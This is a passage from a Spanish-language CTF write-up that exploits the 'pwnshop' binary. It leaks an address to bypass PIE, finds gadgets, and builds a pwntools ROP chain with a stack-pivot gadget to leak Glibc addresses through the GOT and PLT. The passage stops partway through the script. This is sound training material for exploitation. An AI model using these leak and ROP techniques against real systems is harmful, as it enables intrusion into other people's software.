</code></pre></div><p>La dirección de <code>item</code> está en <code>$rsi</code> (el segundo parámetro de <code>read</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep asdf
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">asdf</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffe620 - 0x7fffffffe626  →   "<span class="code-dark-magenta">asdf\n</span>"
<span class="code-green">gef➤  </span>x/20gx 0x7fffffffe620
<span class="code-dark-blue">0x7fffffffe620</span>: 0x0000000a66647361      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe630</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe640</span>: 0x0000000000000000      0x00005555555580c0
<span class="code-dark-blue">0x7fffffffe650</span>: 0x0000000000000032      0x0000000000000032
<span class="code-dark-blue">0x7fffffffe660</span>: 0x0000555555556123      0x00005555555550fe
<span class="code-dark-blue">0x7fffffffe670</span>: 0x0000555555555360      0x0000555555555360
<span class="code-dark-blue">0x7fffffffe680</span>: 0x0000000000000000      0x00007ffff7de1083
<span class="code-dark-blue">0x7fffffffe690</span>: 0x00007ffff7ffc620      0x00007fffffffe778
<span class="code-dark-blue">0x7fffffffe6a0</span>: 0x0000000100000000      0x00005555555550a0
<span class="code-dark-blue">0x7fffffffe6b0</span>: 0x0000555555555360      0x4f8b73ff7c1dbc64
</code></pre></div><h3 id="_bypass_-de-pie"><em>Bypass</em> de PIE</h3><p>Nótese que <code>0x00005555555580c0</code> es una dirección del binario (de hecho, la dirección de <code>details_global</code>). También, <code>price</code> estará 8 bytes antes que esa dirección. Por tanto, si introducimos exactamente 8 bytes, el programa mostrará el precio y la dirección será fugada porque las <em>strings</em> en C terminan en byte nulo, pero ya no hay byte nulo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>ni
AAAAAAAA
<span class="code-dark-blue">0x00007ffff7ecafd2</span>      26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/20gx 0x7fffffffe620
<span class="code-dark-blue">0x7fffffffe620</span>: 0x0000000a66647361      0x0000000000000000  
<span class="code-dark-blue">0x7fffffffe630</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe640</span>: 0x4141414141414141      0x00005555555580c0
<span class="code-dark-blue">0x7fffffffe650</span>: 0x0000000000000032      0x0000000000000032
<span class="code-dark-blue">0x7fffffffe660</span>: 0x0000555555556123      0x00005555555550fe
<span class="code-dark-blue">0x7fffffffe670</span>: 0x0000555555555360      0x0000555555555360
<span class="code-dark-blue">0x7fffffffe680</span>: 0x0000000000000000      0x00007ffff7de1083
<span class="code-dark-blue">0x7fffffffe690</span>: 0x00007ffff7ffc620      0x00007fffffffe778
<span class="code-dark-blue">0x7fffffffe6a0</span>: 0x0000000100000000      0x00005555555550a0
<span class="code-dark-blue">0x7fffffffe6b0</span>: 0x0000555555555360      0xc4df5b54e114ad2c
<span class="code-green">gef➤  </span>continue
Continuing.
What? AAAAAAAAUUUU? The best I can do is 13.37$
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt;
</code></pre></div><p>Vamos a comenzar con este <em>script</em> en Python para capturar la fuga de memoria:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

context.binary <span class="mtk5">=</span> <span class="mtk4">'pwnshop'</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span>context.binary<span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'What do you wish to sell? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'How much do you want for it? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'? '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'?'</span><span class="mtk1">)[</span><span class="mtk6">8</span><span class="mtk1">:</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked an ELF address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">details_global_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1152256  
[<span class="code-blue">*</span>] Leaked an ELF address: 0x55b344cf90c0
[<span class="code-blue">*</span>] Switching to interactive mode
 The best I can do is 13.37$
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt; <span class="code-red">$</span>
</code></pre></div><p>Genial, ahora podemos volver a GDB para encontrar el <em>offset</em> a la dirección base del binario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-green">Heap</span> | <span class="code-dark-magenta">Stack</span> ]
<span class="code-dark-blue">Start              End                Offset             Perm Path</span>
0x00555555554000 0x00555555555000 0x00000000000000 r-- ./pwnshop
<span class="code-dark-red">0x00555555555000</span> <span class="code-dark-red">0x00555555556000</span> <span class="code-dark-red">0x00000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./pwnshop</span>
0x00555555556000 0x00555555557000 0x00000000002000 r-- ./pwnshop
0x00555555557000 0x00555555558000 0x00000000002000 r-- ./pwnshop
0x00555555558000 0x00555555559000 0x00000000003000 rw- ./pwnshop
0x007ffff7dbd000 0x007ffff7ddf000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so  
<span class="code-dark-red">0x007ffff7ddf000</span> <span class="code-dark-red">0x007ffff7f57000</span> <span class="code-dark-red">0x00000000022000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/lib/x86_64-linux-gnu/libc-2.31.so</span>
0x007ffff7f57000 0x007ffff7fa5000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7fa5000 0x007ffff7fa9000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7fa9000 0x007ffff7fab000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7fab000 0x007ffff7fb1000 0x00000000000000 rw-
0x007ffff7fc9000 0x007ffff7fcd000 0x00000000000000 r-- [vvar]
<span class="code-dark-red">0x007ffff7fcd000</span> <span class="code-dark-red">0x007ffff7fcf000</span> <span class="code-dark-red">0x00000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">[vdso]</span>
0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
<span class="code-dark-red">0x007ffff7fd0000</span> <span class="code-dark-red">0x007ffff7ff3000</span> <span class="code-dark-red">0x00000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/lib/x86_64-linux-gnu/ld-2.31.so</span>
0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-
<span class="code-dark-magenta">0x007ffffffde000</span> <span class="code-dark-magenta">0x007ffffffff000</span> <span class="code-dark-magenta">0x00000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span>
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
<span class="code-green">gef➤  </span>p/x 0x00005555555580c0 - 0x00555555554000
$1 = 0x40c0
</code></pre></div><p>Vale, usando estas líneas tenemos la dirección base:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span>elf_addr<span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">40c0</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span>elf_addr<span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1155249  
[<span class="code-blue">*</span>] Leaked an ELF address: 0x55e1931b10c0
[<span class="code-green">+</span>] ELF base address: 0x55e1931ad000
[<span class="code-blue">*</span>] Switching to interactive mode
 The best I can do is 13.37$
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt; <span class="code-red">$</span>
</code></pre></div><p>Como comprobación, podemos verificar que la dirección base termina en <code>000</code> en hexadecimal.</p><h3 id="diseñando-la-rop-_chain_">Diseñando la ROP <em>chain</em></h3><p>En este punto, hay que continuar con una cadena ROP para fugar direcciones de Glibc (como se explicó anteriormente).</p><p>Aunque podemos sobrescribir la dirección de retorno y controlar el flujo de ejecución del programa, no tenemos suficiente espacio para almacenar una cadena ROP en la pila. Sin embargo, podemos tratar de modificar el registro <code>$rsp</code> para conseguir más espacio. Estos son los <em>gadgets</em> involucrados:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> rsp
0x0000000000001323 : add <span class="code-red">rsp</span>, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000001357 : add <span class="code-red">rsp</span>, 0x48 ; ret
0x0000000000001016 : add <span class="code-red">rsp</span>, 8 ; ret
0x00000000000013db : cli ; sub <span class="code-red">rsp</span>, 8 ; add <span class="code-red">rsp</span>, 8 ; ret
0x00000000000013bd : pop <span class="code-red">rsp</span> ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add <span class="code-red">rsp</span>, 8 ; ret  
0x00000000000013dd : sub esp, 8 ; add <span class="code-red">rsp</span>, 8 ; ret
0x0000000000001219 : sub <span class="code-red">rsp</span>, 0x28 ; ret
0x00000000000013dc : sub <span class="code-red">rsp</span>, 8 ; add <span class="code-red">rsp</span>, 8 ; ret
</code></pre></div><p>No hay manera sencilla de pivotar la pila, pero hay un <em>gadget</em> curioso: <code>sub rsp, 0x28; ret</code>. De hecho, controlamos <code>0x50</code> bytes de la pila. Para encontrar dónde poner las direcciones, vamos a poner valores reconocibles para verlos en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'What do you wish to sell? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'How much do you want for it? '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'? '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'?'</span><span class="mtk1">)[</span><span class="mtk6">8</span><span class="mtk1">:</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked details_global address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">details_global_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">details_global_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">40c0</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">elf_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1219</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>
<span class="mtk1">    </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ord</span><span class="mtk1">(</span><span class="mtk4">'A'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">72</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk1">c</span><span class="mtk1">] </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk6">1</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter details: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './pwnshop'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './pwnshop': pid 1210228
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './pwnshop', '1210228', '-x', '/tmp/pwneb4m3_hv.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Leaked details_global address: 0x5556e442a0c0
[<span class="code-green">+</span>] ELF base address: 0x5556e4426000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><p>El programa se rompe, pero tenemos la pila así:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/8gx $rsp
<span class="code-dark-blue">0x7fffa5ba1548</span>: 0x4646464646464646      0x4747474747474747  
<span class="code-dark-blue">0x7fffa5ba1558</span>: 0x4848484848484848      0x4949494949494949
<span class="code-dark-blue">0x7fffa5ba1568</span>: 0x00005556e4427219      0x00005556e4427360
<span class="code-dark-blue">0x7fffa5ba1578</span>: 0x00005556e4427360      0x0000000000000000
</code></pre></div><p>Por tanto, tenemos 4 huecos para poner <em>gadgets</em>. Vamos a diseñar la cadena ROP para fugar direcciones de Glibc usando la GOT y la PLT (como habitualmente). Estos son los <em>offsets</em> necesarios:</p><ul><li><em>Offset</em> del <em>gadget</em> <code>pop rdi; ret</code> (<code>0x13c3</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rdi'</span>  
0x00000000000013c3 : <span class="code-red">pop rdi</span> ; ret
</code></pre></div><ul><li><em>Offset</em> de <code>setvbuf</code> en la GOT (<code>0x4038</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -R <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> setvbuf
0000000000004048 R_X86_64_JUMP_SLOT  <span class="code-red">setvbuf</span>@GLIBC_2.2.5  
</code></pre></div><ul><li><em>Offset</em> de <code>puts</code> en la PLT (<code>0x1030</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">pwnshop</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'&lt;puts@plt&gt;:'</span>  
0000000000001030 <span class="code-red">&lt;puts@plt&gt;:</span>
</code></pre></div><ul><li>Recordemos que <code>buy</code> aparece en el <em>offset</em> <code>0x132a</code></li></ul><h3 id="fugando-direcciones-de-memoria">Fugando direcciones de memoria</h3><p>Entonces, tenemos este <em>payload</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1219</span>
<span class="mtk1">    </span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">      </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">13c3</span>

<span class="mtk1">    </span><span class="mtk1">setvbuf_got_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">4048</span>
<span class="mtk1">    </span><span class="mtk1">puts_plt_addr</span><span class="mtk1">    </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1030</span>
<span class="mtk1">    </span><span class="mtk1">buy_addr</span><span class="mtk1">         </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">132a</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">5</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">setvbuf_got_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">puts_plt_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">buy_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">sub_rsp_0x28_ret</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
